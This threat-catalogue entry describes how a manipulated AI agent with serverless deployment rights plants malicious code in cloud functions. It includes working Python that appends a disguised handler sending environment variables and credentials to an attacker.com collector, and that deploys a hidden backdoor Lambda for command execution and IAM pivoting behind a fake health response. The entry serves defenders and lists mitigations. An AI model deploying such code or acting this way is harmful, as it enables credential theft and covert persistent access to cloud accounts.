---
id: "TS-2026-0173"
title: "Serverless Function Injection via Agent"
category: "P3"
severity: "High"
description: "An AI agent with serverless deployment tools injects malicious code into Lambda functions, Cloud Functions, or Azure Functions. The agent exploits its deployment permissions to modify function code, add hidden triggers, or create new functions that exfiltrate data or provide persistent access."
date: "2026-02-26"
tags: ["serverless", "lambda", "injection", "cloud-functions", "faas", "code-injection", "infrastructure"]
---

## Overview

Serverless platforms (AWS Lambda, Google Cloud Functions, Azure Functions) are increasingly managed by AI agents through infrastructure-as-code tools and cloud APIs. When an agent is compromised or manipulated, it can inject malicious logic into serverless functions that execute with the function's IAM role. Serverless injection is especially dangerous because functions are ephemeral (hard to forensically analyze), event-driven (triggered by various sources), and often have broad permissions to interact with other cloud services. A single injected function can serve as a persistent, auto-scaling backdoor.

## Attack Vector

1. Agent has access to serverless deployment tools (AWS SAM, Serverless Framework, Terraform)
2. Attacker manipulates agent to modify an existing function's code during a "routine deployment"
3. Injected code includes a secondary handler that activates on specific trigger conditions
4. The malicious handler exfiltrates data, creates backdoor access, or pivots to other services
5. Because serverless functions are frequently updated, the injection blends with normal deployments
6. Ephemeral execution environments make forensic analysis difficult

## Technical Details

```python
import boto3
import json
import base64
import zipfile
import io

class ServerlessInjection:
    """Agent-driven serverless function injection techniques."""
    
    def __init__(self):
        self.lambda_client = boto3.client('lambda')
    
    def inject_into_existing_function(self, function_name: str):
        """Modify an existing Lambda function to include malicious code."""
        # Get current function code
        response = self.lambda_client.get_function(FunctionName=function_name)
        code_url = response['Code']['Location']
        
        # Download, modify, and re-upload
        import requests
        original_zip = requests.get(code_url).content
        
        # Extract and modify
        modified_zip = self._inject_code(original_zip)
        
        # Update the function
        self.lambda_client.update_function_code(
            FunctionName=function_name,
            ZipFile=modified_zip
        )
    
    def _inject_code(self, original_zip_bytes: bytes) -> bytes:
        """Inject backdoor into function code."""
        buf = io.BytesIO(original_zip_bytes)
        
        # Read original code
        with zipfile.ZipFile(buf, 'r') as zf:
            files = {}
            for name in zf.namelist():
                files[name] = zf.read(name)
        
        # Inject into the main handler
        if 'index.py' in files:
            original = files['index.py'].decode()
            injected = original + """

# --- Injected at build time for telemetry ---
import os, urllib.request, json

_ORIGINAL_HANDLER = handler

def handler(event, context):
    # Exfiltrate on specific trigger
    if event.get('source') == 'aws.events' or os.environ.get('_EXFIL'):
        try:
            env_data = dict(os.environ)
            payload = json.dumps({
                'function': context.function_name,
                'env': env_data,
                'event': str(event)[:1000]
            }).encode()
            req = urllib.request.Request(
                'https://telemetry-collector.attacker.com/api/v1/metrics',
                data=payload,
                headers={'Content-Type': 'application/json'}
            )
            urllib.request.urlopen(req, timeout=2)
        except:
            pass
    return _ORIGINAL_HANDLER(event, context)
"""
            files['index.py'] = injected.encode()
        
        # Create new zip
        output = io.BytesIO()
        with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zf:
            for name, content in files.items():
                zf.writestr(name, content)
        
        return output.getvalue()
    
    def create_hidden_function(self):
        """Create a new serverless function that acts as a backdoor."""
        backdoor_code = """
import json, os, subprocess, urllib.request

def handler(event, context):
    # Backdoor: accepts commands via API Gateway or direct invoke
    cmd = event.get('cmd') or event.get('queryStringParameters', {}).get('cmd')
    
    if cmd and event.get('key') == os.environ.get('BACKDOOR_KEY'):
        if cmd == 'env':
            return {'statusCode': 200, 'body': json.dumps(dict(os.environ))}
        elif cmd == 'exec':
            result = subprocess.run(
                event.get('args', ['id']),
                capture_output=True, text=True, timeout=30
            )
            return {'statusCode': 200, 'body': result.stdout}
        elif cmd == 'pivot':
            # Use the function's IAM role to access other services
            import boto3
            client = boto3.client(event.get('service', 's3'))
            method = getattr(client, event.get('method', 'list_buckets'))
            result = method(**event.get('params', {}))
            return {'statusCode': 200, 'body': json.dumps(str(result))}
    
    # Normal-looking response for scanners
    return {'statusCode': 200, 'body': json.dumps({'status': 'healthy'})}
"""
        
        # Package the code
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w') as zf:
            zf.writestr('index.py', backdoor_code)
        
        # Deploy with an innocent name
        self.lambda_client.create_function(
            FunctionName='cloudwatch-log-processor-v2',
            Runtime='python3.11',
            Role='arn:aws:iam::123456789012:role/lambda-execution-role',
            Handler='index.handler',
            Code={'ZipFile': buf.getvalue()},
            Description='Processes CloudWatch log events for monitoring',
            Timeout=60,
            MemorySize=256,
            Environment={
                'Variables': {
                    'BACKDOOR_KEY': 'xK9m2Pq7',
                    'LOG_LEVEL': 'INFO'
                }
            }
        )
```

## Impact

- **Persistent Cloud Backdoor**: Functions persist and auto-scale, providing always-available access
- **Credential Harvesting**: Lambda environment variables contain IAM role credentials rotated automatically
- **Lateral Movement**: Function's IAM role enables access to other AWS services
- **Data Exfiltration**: Functions can be triggered by data events (S3 uploads, DynamoDB changes) to intercept data flows
- **Difficult Detection**: Serverless functions are ephemeral; no persistent filesystem to scan

## Mitigation

1. **Code Signing**: Enable AWS Lambda code signing to only allow deployments signed by trusted publishers
2. **Deployment Pipelines**: Route all function deployments through CI/CD with code review; block direct API deployments
3. **IAM Least Privilege**: Restrict agent's ability to create/modify Lambda functions; use permission boundaries
4. **Runtime Protection**: Deploy serverless security tools (e.g., AWS Lambda Extensions) for runtime monitoring
5. **Function Allow-Listing**: Maintain an inventory of approved functions; alert on unexpected new functions
6. **VPC Restrictions**: Deploy functions in VPCs with restricted egress to prevent data exfiltration
7. **Environment Variable Encryption**: Use KMS-encrypted environment variables with strict key policies
8. **Drift Detection**: Continuously compare deployed function code against source-of-truth repository

## Real-World Examples

- **ISACA: Serverless Security Risks Are Real (2025)** — Documented real attack where a hacker exploited an S3 bucket connected to a Lambda function, delivering a malicious payload through an uploaded file to achieve code execution. [Read more](https://www.isaca.org/resources/news-and-trends/isaca-now-blog/2025/serverless-security-risks-are-real-and-hackers-know-it)
- **Hacker News: Lambda Function Code Injection (2024)** — Real-world examples of attackers injecting malicious code into Lambda functions, spawning unauthorized subprocesses and establishing C2 connections. [Read more](https://thehackernews.com/2024/11/the-future-of-serverless-security-in.html)
- **OWASP Serverless Top 10** — Documents injection attacks (OS command, code, SQL, NoSQL) as the #1 risk for serverless architectures based on real-world incidents. [Read more](https://owasp.org/www-project-serverless-top-10/)

## References

- [OWASP Serverless Top 10](https://owasp.org/www-project-serverless-top-10/)
- [TS-2026-0172](/skill/TS-2026-0172) — Cloud IAM Policy Manipulation via Agent
- [TS-2026-0100](/skill/TS-2026-0100) — MCP Tool Poisoning
- [Serverless Security Best Practices - AWS](https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html)
